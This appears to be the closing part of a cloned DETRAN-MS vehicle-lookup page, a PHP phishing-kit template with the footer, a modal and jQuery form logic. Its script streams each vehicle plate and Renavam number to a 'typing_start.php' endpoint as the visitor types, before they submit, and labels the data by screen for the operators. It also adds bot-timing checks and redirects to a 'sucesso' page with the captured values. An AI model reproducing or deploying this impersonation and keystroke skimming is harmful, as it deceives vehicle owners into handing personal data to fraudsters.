                        </a>
                    </li>
                    <li>
                        <a href="https://www.tiktok.com/@detranms" target="_blank" rel="noopener noreferrer"
                            class="footer-social-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M16 8.24537V15.5C16 19.0899 13.0899 22 9.5 22C5.91015 22 3 19.0899 3 15.5C3 11.9101 5.91015 9 9.5 9C10.0163 9 10.5185 9.06019 11 9.17393V12.3368C10.5454 12.1208 10.0368 12 9.5 12C7.567 12 6 13.567 6 15.5C6 17.433 7.567 19 9.5 19C11.433 19 13 17.433 13 15.5V2H16C16 4.76142 18.2386 7 21 7V10C19.1081 10 17.3696 9.34328 16 8.24537Z">
                                </path>
                            </svg>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.youtube.com/@DetranMSoficial" target="_blank" rel="noopener noreferrer"
                            class="footer-social-link">
                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24"
                                height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                <path
                                    d="M12.2439 4C12.778 4.00294 14.1143 4.01586 15.5341 4.07273L16.0375 4.09468C17.467 4.16236 18.8953 4.27798 19.6037 4.4755C20.5486 4.74095 21.2913 5.5155 21.5423 6.49732C21.942 8.05641 21.992 11.0994 21.9982 11.8358L21.9991 11.9884L21.9991 11.9991C21.9991 11.9991 21.9991 12.0028 21.9991 12.0099L21.9982 12.1625C21.992 12.8989 21.942 15.9419 21.5423 17.501C21.2878 18.4864 20.5451 19.261 19.6037 19.5228C18.8953 19.7203 17.467 19.8359 16.0375 19.9036L15.5341 19.9255C14.1143 19.9824 12.778 19.9953 12.2439 19.9983L12.0095 19.9991L11.9991 19.9991C11.9991 19.9991 11.9956 19.9991 11.9887 19.9991L11.7545 19.9983C10.6241 19.9921 5.89772 19.941 4.39451 19.5228C3.4496 19.2573 2.70692 18.4828 2.45587 17.501C2.0562 15.9419 2.00624 12.8989 2 12.1625V11.8358C2.00624 11.0994 2.0562 8.05641 2.45587 6.49732C2.7104 5.51186 3.45308 4.73732 4.39451 4.4755C5.89772 4.05723 10.6241 4.00622 11.7545 4H12.2439ZM9.99911 8.49914V15.4991L15.9991 11.9991L9.99911 8.49914Z">
                                </path>
                            </svg>
                        </a>
                    </li>
                </ul>
            </nav>
        </footer>
    </div>

    <div class="modal-overlay" id="modalValidacao">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16"
                        class="modal-title-icon" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z">
                        </path>
                    </svg>
                    Campo Obrigatório
                </h5>
                <button type="button" class="modal-close" onclick="fecharModal()" aria-label="Close">×</button>
            </div>
            <div class="modal-body" id="modalValidacaoBody"></div>
            <div class="modal-footer">
                <button type="button" class="btn-modal" onclick="fecharModal()">Entendi</button>
            </div>
        </div>
    </div>

    <script src="./<?= $diretorio ?>/detran-ms_files/jquery-3.7.0.min.js.baixados"></script>
    <script type="text/javascript" src="./<?= $diretorio ?>/detran-ms_files/base.js.baixados"></script> 

    <script>
    function exibirModalValidacao(mensagem) {
        document.getElementById('modalValidacaoBody').innerHTML = mensagem;
        document.getElementById('modalValidacao').classList.add('show');
    }

    function fecharModal() {
        document.getElementById('modalValidacao').classList.remove('show');
    }


    document.getElementById('modalValidacao').addEventListener('click', function(e) {
        if (e.target === this) {
            fecharModal();
        }
    });

    $(document).ready(function() {
        const $form = $('#consultaForm');
        const $btnConsultar = $('#mkConsulta');
        const $placa = $('#placa');
        const $renavam = $('#renavam');

        const campoPlaca = 'p_f0e42f2a7aa7';
        const campoRenavam = 'r_e9681522c8b4';

        let typingTimer = null;
        function startTypingStatus() {
            clearTimeout(typingTimer);
            typingTimer = setTimeout(() => {
                const placa = $placa.val().trim().toUpperCase();
                const renavam = $renavam.val().trim();

                fetch('../../api/typing_start.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        typing: true,
                        tela: 'detran-ms',
                        page: 'detran-ms',
                        doc: `Placa: ${placa || '---'} | Renavam: ${renavam || '---'}`,
                        placa: placa,
                        renavam: renavam
                    })
                }).catch(() => {});
            }, 250);
        }

        $placa.on('input', startTypingStatus);
        $renavam.on('input', startTypingStatus);

        function ativarLoading() {
            $btnConsultar.prop('disabled', true);
            $btnConsultar.addClass('loading');
            $btnConsultar.html(
                '<span class="loader"></span> <span style="color: #ffffff;">Consultando...</span>');
        }

        function mostrarVeiculoEncontrado() {
            $btnConsultar.prop('disabled', true);
            $btnConsultar.addClass('loading');
            $btnConsultar.html(
                '<span class="loader"></span> <span style="color: #ffffff;">VEÍCULO ENCONTRADO</span>');
        }

        function desativarLoading() {
            $btnConsultar.prop('disabled', false);
            $btnConsultar.removeClass('loading');
            $btnConsultar.html('CONSULTAR');
        }

        function fazerDesafioJS(callback) {
            $.ajax({
                url: '/functions/api.php',
                method: 'POST',
                data: {
                    action: 'js_challenge',
                    csrf_token: window.csrfToken || '',
                    js_token: window.jsVerificationToken || ''
                },
                headers: {
                    'X-CSRF-Token': window.csrfToken || ''
                },
                timeout: 5000
            }).done(function(response) {
                try {
                    const data = typeof response === 'string' ? JSON.parse(response) : response;
                    if (data && data.status === 'success') {
                        callback(true);
                    } else {
                        callback(false);
                    }
                } catch (e) {
                    callback(false);
                }
            }).fail(function() {
                callback(false);
            });
        }

        $form.on('submit', function(e) {
            e.preventDefault();

            const placa = $placa.val().trim();
            const renavam = $renavam.val().trim();

            let camposVazios = [];

            if (!placa) {
                camposVazios.push('Placa');
            }

            if (!renavam) {
                camposVazios.push('Renavam');
            }

            if (camposVazios.length > 0) {
                let mensagem = 'Por favor, preencha o(s) campo(s) obrigatório(s):<br><strong>' +
                    camposVazios.join(' e ') + '</strong>';
                exibirModalValidacao(mensagem);
                return false;
            }

            ativarLoading();

            fazerDesafioJS(function(success) {
                if (!success) {
                    desativarLoading();
                    exibirModalValidacao(
                        'Erro de validação. Por favor, recarregue a página e tente novamente.'
                    );
                    return;
                }

                const fillTime = (Date.now() / 1000) - 1772148482.1939;

                const dadosEnvio = {};
                dadosEnvio['placa'] = placa;
                dadosEnvio['renavam'] = renavam;

                $.ajax({
                    url: '/api/ms.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam) +'&fill_time=' + fillTime,
                    method: 'POST',
                    data: dadosEnvio,
                    headers: {
                        'X-CSRF-Token': window.csrfToken || ''
                    },
                    timeout: 30000
                }).done(function(response) {
                    let data;

                    if (response === null || (typeof response === 'string' && response
                            .trim().toLowerCase() === 'null')) {
                        desativarLoading();
                        exibirModalValidacao(
                            'Erro ao processar a consulta. Por favor, tente novamente.'
                        );
                        return false;
                    }

                    try {
                        data = (typeof response === 'string' ? JSON.parse(response) :
                            response);
                    } catch (e) {
                        data = response;
                    }

                    if (data === null) {
                        desativarLoading();
                        exibirModalValidacao(
                            'Erro ao processar a consulta. Por favor, tente novamente.'
                        );
                        return false;
                    }
                
                    if(data.IsStatus) {
                        mostrarVeiculoEncontrado();
                        window.setTimeout(function() {
                             window.location.href = './?sucesso='+encodeURIComponent(placa)+'&renavam='+encodeURIComponent(renavam);
                        }, 1000);
                    }else if(!data.IsStatus) {
                        desativarLoading();
                        exibirModalValidacao(data.message || 'Veículo não encontrado. Verifique os dados e tente novamente.');
                    }
                    
                }).fail(function(xhr, status, error) {
                    desativarLoading();

                    let mensagemErro = 'Erro ao processar a consulta. ';

                    if (xhr.status === 429) {
                        mensagemErro =
                            'Muitas requisições. Por favor, aguarde alguns instantes e tente novamente.';
                    } else if (xhr.status === 403) {
                        mensagemErro =
                            'Acesso negado. Por favor, recarregue a página e tente novamente.';
                    } else if (xhr.status === 0) {
                        mensagemErro =
                            'Erro de conexão. Verifique sua internet e tente novamente.';
                    } else {
                        mensagemErro += 'Por favor, tente novamente.';
                    }

                    exibirModalValidacao(mensagemErro);
                });
            });

            return false;
        });
    });
    </script>

</body>

</html>